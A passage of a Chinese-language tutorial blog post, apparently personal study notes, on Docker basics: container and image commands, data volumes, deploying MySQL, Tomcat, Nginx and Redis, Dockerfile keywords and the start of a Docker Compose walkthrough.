class=\"line\">docker search 镜像名称</span><br><span class=\"line\"></span><br><span class=\"line\">拉取镜像:从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本。</span><br><span class=\"line\">如果不知道镜像版本，可以去docker hub 搜索对应镜像查看。</span><br><span class=\"line\">docker pull 镜像名称 eg:docker pull redis:3.2</span><br><span class=\"line\"></span><br><span class=\"line\">删除镜像: 删除本地镜像</span><br><span class=\"line\">docker rmi 镜像<span class=\"built_in\">id</span> <span class=\"comment\"># 删除指定本地镜像</span></span><br><span class=\"line\">docker rmi `docker images -q` <span class=\"comment\"># 删除所有本地镜像</span></span><br></pre></td></tr></table></figure>\n\n<p>想要看镜像有哪些版本可以去dockerhub：<a href=\"https://hub.docker.com/\">https://hub.docker.com/</a></p>\n<h5 id=\"Docker容器相关命令\"><a href=\"#Docker容器相关命令\" class=\"headerlink\" title=\"Docker容器相关命令\"></a>Docker容器相关命令</h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看容器</span><br><span class=\"line\">docker ps <span class=\"comment\"># 查看正在运行的容器</span></span><br><span class=\"line\">docker ps –a <span class=\"comment\"># 查看所有容器</span></span><br><span class=\"line\"></span><br><span class=\"line\">创建容器</span><br><span class=\"line\">docker run 参数(可以使用docker run --<span class=\"built_in\">help</span>看对应说明)</span><br><span class=\"line\">-i：保持容器运行。通常与 -t 同时使用。加入it这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭。</span><br><span class=\"line\">• -t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。</span><br><span class=\"line\">• -d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用docker <span class=\"built_in\">exec</span> 进入容器。退出后，容器不会关闭。</span><br><span class=\"line\">• -it 创建的容器一般称为交互式容器，-<span class=\"built_in\">id</span> 创建的容器一般称为守护式容器</span><br><span class=\"line\">• --name：为创建的容器命名</span><br><span class=\"line\">docker run -it --name=cl centos:7 /bin/bash</span><br><span class=\"line\">docker run -<span class=\"built_in\">id</span> --name=c2 centos:7 </span><br><span class=\"line\"></span><br><span class=\"line\">进入容器</span><br><span class=\"line\">docker <span class=\"built_in\">exec</span> 参数 <span class=\"comment\"># 退出容器，容器不会关闭</span></span><br><span class=\"line\"></span><br><span class=\"line\">启动容器</span><br><span class=\"line\">docker start 容器名称</span><br><span class=\"line\"></span><br><span class=\"line\">停止容器</span><br><span class=\"line\">docker stop 容器名</span><br><span class=\"line\"></span><br><span class=\"line\">删除容器</span><br><span class=\"line\">docker <span class=\"built_in\">rm</span> 容器名称</span><br><span class=\"line\"></span><br><span class=\"line\">查看容器信息</span><br><span class=\"line\">docker inspect 容器名称</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、Docker容器的数据卷\"><a href=\"#3、Docker容器的数据卷\" class=\"headerlink\" title=\"3、Docker容器的数据卷\"></a>3、Docker容器的数据卷</h3><h5 id=\"数据卷概念及作用\"><a href=\"#数据卷概念及作用\" class=\"headerlink\" title=\"数据卷概念及作用\"></a>数据卷概念及作用</h5><p>问题：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Docker 容器删除后，在容器中产生的数据也会随之销毁 </span><br><span class=\"line\">Docker 容器和外部机器可以直接交换文件吗？ </span><br><span class=\"line\">容器之间想要进行数据交互？</span><br></pre></td></tr></table></figure>\n\n<p>数据卷：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">数据卷是宿主机中的一个目录或文件</span><br><span class=\"line\">当容器目录和数据卷目录绑定后，对方的修改会立即同步</span><br><span class=\"line\">一个数据卷可以被多个容器同时挂载</span><br><span class=\"line\">一个容器也可以被挂载多个数据卷</span><br></pre></td></tr></table></figure>\n\n<p>数据卷作用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">容器数据持久化 </span><br><span class=\"line\">外部机器和容器间接通信 </span><br><span class=\"line\">容器之间数据交换</span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"配置数据卷\"><a href=\"#配置数据卷\" class=\"headerlink\" title=\"配置数据卷\"></a>配置数据卷</h5><p>创建启动容器时，使用 –v 参数 设置数据卷 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run ... –v 宿主机目录(文件):容器内目录(文件) ...  </span><br><span class=\"line\">注意事项： 1. 目录必须是绝对路径 2. 如果目录不存在，会自动创建 3. 可以挂载多个数据卷</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301101912652.png\" alt=\"image-20230301101912652\"></p>\n<p>可以看到能够同步，可以简单理解为共享文件夹</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301103733215.png\" alt=\"image-20230301103733215\"></p>\n<p><strong>如果忘了对应的数据卷可以用inspect看</strong></p>\n<h5 id=\"数据卷容器\"><a href=\"#数据卷容器\" class=\"headerlink\" title=\"数据卷容器\"></a>数据卷容器</h5><p>多容器进行数据交换 1. 多个容器挂载同一个数据卷 2. 数据卷容器</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301102705638.png\" alt=\"image-20230301102705638\" style=\"zoom: 67%;\" />\n\n<h5 id=\"配置数据卷容器\"><a href=\"#配置数据卷容器\" class=\"headerlink\" title=\"配置数据卷容器\"></a>配置数据卷容器</h5><p>1、创建启动c3数据卷容器，使用 –v 参数 设置数据卷 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run –it --name=c3 –v /volume centos:7 /bin/bash  </span><br></pre></td></tr></table></figure>\n\n<p>2、创建启动 c1 c2 容器，使用 –-volumes-from 参数 设置数据卷</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run –it --name=c1 --volumes-from c3 centos:7 /bin/bash </span><br><span class=\"line\">docker run –it --name=c2 --volumes-from c3 centos:7 /bin/bash </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4、Docker应用部署\"><a href=\"#4、Docker应用部署\" class=\"headerlink\" title=\"4、Docker应用部署\"></a>4、Docker应用部署</h3><h5 id=\"MySql部署：\"><a href=\"#MySql部署：\" class=\"headerlink\" title=\"MySql部署：\"></a>MySql部署：</h5><p>需求：在Docker容器中部署MySQL，并通过外部mysql客户端操作MySQL Server。</p>\n<p>案例：① 搜索mysql镜像 ② 拉取mysql镜像 ③ 创建容器 ④ 操作容器中的mysql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">当容器中的网络服务需要被外部机器访问时，可以将容器中提供服务的端口映射到宿主机的端口上。外部机 器访问宿主机的该端口，从而间接访问容器的服务。 </span><br><span class=\"line\"></span><br><span class=\"line\">这种操作称为：端口映射</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301105421936.png\" alt=\"image-20230301105421936\"></p>\n<ol>\n<li>搜索mysql镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search mysql</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取mysql镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull mysql:5.6</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射、目录映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在/root目录下创建mysql目录用于存储mysql数据信息</span></span><br><span class=\"line\">mkdir ~/mysql</span><br><span class=\"line\">cd ~/mysql</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id \\</span><br><span class=\"line\">-p 3307:3306 \\</span><br><span class=\"line\">--name=c_mysql \\</span><br><span class=\"line\">-v $PWD/conf:/etc/mysql/conf.d \\</span><br><span class=\"line\">-v $PWD/logs:/logs \\</span><br><span class=\"line\">-v $PWD/data:/var/lib/mysql \\</span><br><span class=\"line\">-e MYSQL_ROOT_PASSWORD=123456 \\</span><br><span class=\"line\">mysql:5.6</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>参数说明：<ul>\n<li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li>\n<li><strong>-v $PWD&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d</strong>：将主机当前目录下的 conf&#x2F;my.cnf 挂载到容器的 &#x2F;etc&#x2F;mysql&#x2F;my.cnf。配置目录</li>\n<li><strong>-v $PWD&#x2F;logs:&#x2F;logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 &#x2F;logs。日志目录</li>\n<li><strong>-v $PWD&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql</strong> ：将主机当前目录下的data目录挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql 。数据目录</li>\n<li><strong>-e MYSQL_ROOT_PASSWORD&#x3D;123456：</strong>初始化 root 用户的密码。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>进入容器，操作mysql</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec –it c_mysql /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301115710533.png\" alt=\"image-20230301115710533\"></p>\n<ol start=\"5\">\n<li>使用外部机器连接容器中的mysql</li>\n</ol>\n<h5 id=\"部署Tomcat\"><a href=\"#部署Tomcat\" class=\"headerlink\" title=\"部署Tomcat\"></a>部署Tomcat</h5><p>要求：在Docker容器中部署Tomcat，并通过外部机器访问Tomcat部署的项目。</p>\n<p>实现步骤 ① 搜索tomcat镜像 ② 拉取tomcat镜像 ③ 创建容器 ④ 部署项目 ⑤ 测试访问</p>\n<ol>\n<li>搜索tomcat镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search tomcat</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取tomcat镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull tomcat</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射、目录映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在/root目录下创建tomcat目录用于存储tomcat数据信息</span></span><br><span class=\"line\">mkdir ~/tomcat</span><br><span class=\"line\">cd ~/tomcat</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id --name=c_tomcat \\</span><br><span class=\"line\">-p 8080:8080 \\</span><br><span class=\"line\">-v $PWD:/usr/local/tomcat/webapps \\</span><br><span class=\"line\">tomcat </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>参数说明：</p>\n<ul>\n<li><p><strong>-p 8080:8080：</strong>将容器的8080端口映射到主机的8080端口</p>\n<p><strong>-v $PWD:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps：</strong>将主机中当前目录挂载到容器的webapps</p>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li><p>使用外部机器访问tomcat</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301141233554.png\" alt=\"image-20230301141233554\" style=\"zoom:50%;\" />\n\n<p>成功</p>\n</li>\n</ol>\n<h5 id=\"部署Nginx\"><a href=\"#部署Nginx\" class=\"headerlink\" title=\"部署Nginx\"></a>部署Nginx</h5><p>需求：在Docker容器中部署Nginx，并通过外部机器访问Nginx</p>\n<p>步骤：① 搜索Nginx镜像 ② 拉取Nginx镜像 ③ 创建容器 ④ 测试访问</p>\n<ol>\n<li>搜索nginx镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search nginx</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取nginx镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull nginx</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射、目录映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在/root目录下创建nginx目录用于存储nginx数据信息</span></span><br><span class=\"line\">mkdir ~/nginx</span><br><span class=\"line\">cd ~/nginx</span><br><span class=\"line\">mkdir conf</span><br><span class=\"line\">cd conf</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span></span><br><span class=\"line\">vim nginx.conf</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">user  nginx;</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">error_log  /var/log/nginx/error.log warn;</span><br><span class=\"line\">pid        /var/run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       /etc/nginx/mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class=\"line\">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class=\"line\">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    access_log  /var/log/nginx/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    include /etc/nginx/conf.d/*.conf;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id --name=c_nginx \\</span><br><span class=\"line\">-p 80:80 \\</span><br><span class=\"line\">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \\</span><br><span class=\"line\">-v $PWD/logs:/var/log/nginx \\</span><br><span class=\"line\">-v $PWD/html:/usr/share/nginx/html \\</span><br><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>参数说明：<ul>\n<li><strong>-p 80:80</strong>：将容器的 80端口映射到宿主机的 80 端口。</li>\n<li><strong>-v $PWD&#x2F;conf&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong>：将主机当前目录下的 &#x2F;conf&#x2F;nginx.conf 挂载到容器的 :&#x2F;etc&#x2F;nginx&#x2F;nginx.conf。配置目录</li>\n<li><strong>-v $PWD&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的&#x2F;var&#x2F;log&#x2F;nginx。日志目录</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li><p>使用外部机器访问nginx</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142036233.png\" alt=\"image-20230301142036233\"></p>\n</li>\n</ol>\n<h5 id=\"部署Redis\"><a href=\"#部署Redis\" class=\"headerlink\" title=\"部署Redis\"></a>部署Redis</h5><p>需求：在Docker容器中部署Redis，并通过外部机器访问Redis。</p>\n<p>实现步骤 ① 搜索Redis镜像 ② 拉取Redis镜像 ③ 创建容器 ④ 测试访问</p>\n<ol>\n<li>搜索redis镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search redis</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取redis镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull redis:5.0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id --name=c_redis -p 6379:6379 redis:5.0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>使用外部机器连接redis</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">./redis-cli.exe -h 192.168.149.135 -p 6379</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142459588.png\" alt=\"image-20230301142459588\"></p>\n<h3 id=\"5、Dockerfile\"><a href=\"#5、Dockerfile\" class=\"headerlink\" title=\"5、Dockerfile\"></a>5、Dockerfile</h3><h5 id=\"Docker镜像原理\"><a href=\"#Docker镜像原理\" class=\"headerlink\" title=\"Docker镜像原理\"></a>Docker镜像原理</h5><p>问题：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Docker 镜像本质是什么？</span><br><span class=\"line\">Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class=\"line\">Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br></pre></td></tr></table></figure>\n\n<p>理论知识：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">操作系统组成部分：</span><br><span class=\"line\">进程通信子系统</span><br><span class=\"line\">内存管理子系统</span><br><span class=\"line\">备管理子系统</span><br><span class=\"line\">文件管理子系统</span><br><span class=\"line\">网络通信子系统</span><br><span class=\"line\">作业控制子系统</span><br><span class=\"line\">进程调度子系统</span><br><span class=\"line\"></span><br><span class=\"line\">Linux文件系统由bootfs和rootfs两部分组成</span><br><span class=\"line\">• bootfs：包含bootloader（引导加载程序）和 kernel（内核）</span><br><span class=\"line\">• rootfs： root文件系统，包含的就是典型 Linux 系统中的/dev，/proc，/bin，/etc等标准目录和文件</span><br><span class=\"line\">• 不同的linux发行版，bootfs基本一样，而rootfs不同，如ubuntu，centos等</span><br></pre></td></tr></table></figure>\n\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143313641.png\" alt=\"image-20230301143313641\" style=\"zoom:67%;\" />\n\n<p>问题回答：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. Docker 镜像本质是什么？</span><br><span class=\"line\">• 是一个分层文件系统</span><br><span class=\"line\">2. Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class=\"line\">• Centos的iso镜像文件包含bootfs和rootfs，而docker的centos镜像复用操作系统的bootfs，只有rootfs和其他镜像层</span><br><span class=\"line\">3. Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br><span class=\"line\">• 由于docker中镜像是分层的，tomcat虽然只有70多MB，但他需要依赖于父镜像和基础镜像，所有整个对外暴露的tomcat镜像大小500多MB</span><br></pre></td></tr></table></figure>\n\n<p>docker inspect tomcat 效果：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143908837.png\" alt=\"image-20230301143908837\"></p>\n<h5 id=\"Docker镜像制作\"><a href=\"#Docker镜像制作\" class=\"headerlink\" title=\"Docker镜像制作\"></a>Docker镜像制作</h5><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301144055969.png\" alt=\"image-20230301144055969\" style=\"zoom:50%;\" />\n\n<p> 注意：</p>\n<ol>\n<li>自己制作镜像时，目录挂载不会生效，其它会保存</li>\n</ol>\n<h5 id=\"Dockerfile概念\"><a href=\"#Dockerfile概念\" class=\"headerlink\" title=\"Dockerfile概念\"></a>Dockerfile概念</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Dockerfile 是一个文本文件 </span><br><span class=\"line\">包含了一条条的指令 </span><br><span class=\"line\">每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像 </span><br><span class=\"line\">对于开发人员：可以为开发团队提供一个完全一致的开发环境 </span><br><span class=\"line\">对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件 构建一个新的镜像开始工作了 </span><br><span class=\"line\">对于运维人员：在部署时，可以实现应用的无缝移</span><br></pre></td></tr></table></figure>\n\n<p>参考网站：<a href=\"https://hub.docker.com/\">https://hub.docker.com</a></p>\n<h5 id=\"Dockerfile关键字\"><a href=\"#Dockerfile关键字\" class=\"headerlink\" title=\"Dockerfile关键字\"></a>Dockerfile关键字</h5><table>\n<thead>\n<tr>\n<th>关键字</th>\n<th>作用</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>FROM</td>\n<td>指定父镜像</td>\n<td>指定dockerfile基于那个image构建</td>\n</tr>\n<tr>\n<td>MAINTAINER</td>\n<td>作者信息</td>\n<td>用来标明这个dockerfile谁写的</td>\n</tr>\n<tr>\n<td>LABEL</td>\n<td>标签</td>\n<td>用来标明dockerfile的标签 可以使用Label代替Maintainer 最终都是在docker image基本信息中可以查看</td>\n</tr>\n<tr>\n<td>RUN</td>\n<td>执行命令</td>\n<td>执行一段命令 默认是&#x2F;bin&#x2F;sh 格式: RUN command 或者 RUN [“command” , “param1”,”param2”]</td>\n</tr>\n<tr>\n<td>CMD</td>\n<td>容器启动命令</td>\n<td>提供启动容器时候的默认命令 和ENTRYPOINT配合使用.格式 CMD command param1 param2 或者 CMD [“command” , “param1”,”param2”]</td>\n</tr>\n<tr>\n<td>ENTRYPOINT</td>\n<td>入口</td>\n<td>一般在制作一些执行就关闭的容器中会使用</td>\n</tr>\n<tr>\n<td>COPY</td>\n<td>复制文件</td>\n<td>build的时候复制文件到image中</td>\n</tr>\n<tr>\n<td>ADD</td>\n<td>添加文件</td>\n<td>build的时候添加文件到image中 不仅仅局限于当前build上下文 可以来源于远程服务</td>\n</tr>\n<tr>\n<td>ENV</td>\n<td>环境变量</td>\n<td>指定build时候的环境变量 可以在启动的容器的时候 通过-e覆盖 格式ENV name&#x3D;value</td>\n</tr>\n<tr>\n<td>ARG</td>\n<td>构建参数</td>\n<td>构建参数 只在构建的时候使用的参数 如果有ENV 那么ENV的相同名字的值始终覆盖arg的参数</td>\n</tr>\n<tr>\n<td>VOLUME</td>\n<td>定义外部可以挂载的数据卷</td>\n<td>指定build的image那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用 -v 绑定 格式 VOLUME [“目录”]</td>\n</tr>\n<tr>\n<td>EXPOSE</td>\n<td>暴露端口</td>\n<td>定义容器运行的时候监听的端口 启动容器的使用-p来绑定暴露端口 格式: EXPOSE 8080 或者 EXPOSE 8080&#x2F;udp</td>\n</tr>\n<tr>\n<td>WORKDIR</td>\n<td>工作目录</td>\n<td>指定容器内部的工作目录 如果没有创建则自动创建 如果指定&#x2F; 使用的是绝对地址 如果不是&#x2F;开头那么是在上一条workdir的路径的相对路径</td>\n</tr>\n<tr>\n<td>USER</td>\n<td>指定执行用户</td>\n<td>指定build或者启动的时候 用户 在RUN CMD ENTRYPONT执行的时候的用户</td>\n</tr>\n<tr>\n<td>HEALTHCHECK</td>\n<td>健康检查</td>\n<td>指定监测当前容器的健康监测的命令 基本上没用 因为很多时候 应用本身有健康监测机制</td>\n</tr>\n<tr>\n<td>ONBUILD</td>\n<td>触发器</td>\n<td>当存在ONBUILD关键字的镜像作为基础镜像的时候 当执行FROM完成之后 会执行 ONBUILD的命令 但是不影响当前镜像 用处也不怎么大</td>\n</tr>\n<tr>\n<td>STOPSIGNAL</td>\n<td>发送信号量到宿主机</td>\n<td>该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。</td>\n</tr>\n<tr>\n<td>SHELL</td>\n<td>指定执行脚本的shell</td>\n<td>指定RUN CMD ENTRYPOINT 执行命令的时候 使用的shell</td>\n</tr>\n</tbody></table>\n<h5 id=\"案例1\"><a href=\"#案例1\" class=\"headerlink\" title=\"案例1\"></a>案例1</h5><p>需求：定义dockerfile，发布springboot项目</p>\n<p>实现步骤 ① 定义父镜像：FROM java:8 ② 定义作者信息：MAINTAINER itheima  ③ 将jar包添加到容器： ADD springboot.jar app.jar ④ 定义容器启动执行的命令：CMD java–jar app.jar ⑤ 通过dockerfile构建镜像：docker bulid –f dockerfile文件路径 –t 镜像名称:版本</p>\n<p>成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301152821606.png\" alt=\"image-20230301152821606\"></p>\n<h5 id=\"案例2\"><a href=\"#案例2\" class=\"headerlink\" title=\"案例2\"></a>案例2</h5><p>需求：自定义centos7镜像。</p>\n<p>要求：1.默认登录路经为&#x2F;usr 2.可以使用vim</p>\n<p>dockerfile：</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> centos:<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> realikun404</span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> yum install -y vim</span></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> /bin/bash</span></span><br></pre></td></tr></table></figure>\n\n<p>然后</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker build -f dockerfile -t mycentos:1 .</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6、Docker服务编排\"><a href=\"#6、Docker服务编排\" class=\"headerlink\" title=\"6、Docker服务编排\"></a>6、Docker服务编排</h3><h5 id=\"服务编排概念\"><a href=\"#服务编排概念\" class=\"headerlink\" title=\"服务编排概念\"></a>服务编排概念</h5><p>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停 ，维护的工作量会很大。 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">要从Dockerfile build image 或者去dockerhub拉取image </span><br><span class=\"line\">要创建多个container </span><br><span class=\"line\">要管理这些container（启动停止删除） </span><br></pre></td></tr></table></figure>\n\n<p>服务编排： 按照一定的业务规则批量管理容器</p>\n<h5 id=\"Docker-Compose概述\"><a href=\"#Docker-Compose概述\" class=\"headerlink\" title=\"Docker Compose概述\"></a>Docker Compose概述</h5><p>Docker Compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建 ，启动和停止。使用步骤：</p>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 利用 Dockerfile 定义运行环境镜像</li>\n<li><input disabled=\"\" type=\"checkbox\"> 使用 docker-compose.yml 定义组成应用的各服务</li>\n<li><input disabled=\"\" type=\"checkbox\"> 运行 docker-compose up 启动应用</li>\n</ul>\n<h5 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h5><p>安装Docker Compose</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。</span> </span><br><span class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置文件可执行权限</span> </span><br><span class=\"line\">chmod +x /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看版本信息</span> </span><br><span class=\"line\">docker-compose -version</span><br></pre></td></tr></table></figure>\n\n<p>卸载Docker Compose</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">二进制包方式安装的，删除二进制文件即可</span></span><br><span class=\"line\">rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>\n\n\n\n<p>使用docker compose编排nginx+springboot项目</p>\n<ol>\n<li>创建docker-compose目录</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir ~/docker-compose</span><br><span class=\"line\">cd ~/docker-compose</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>编写 docker-compose.yml 文件</li>\n</ol>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\">version: <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\">services:</span><br><span class=\"line\">  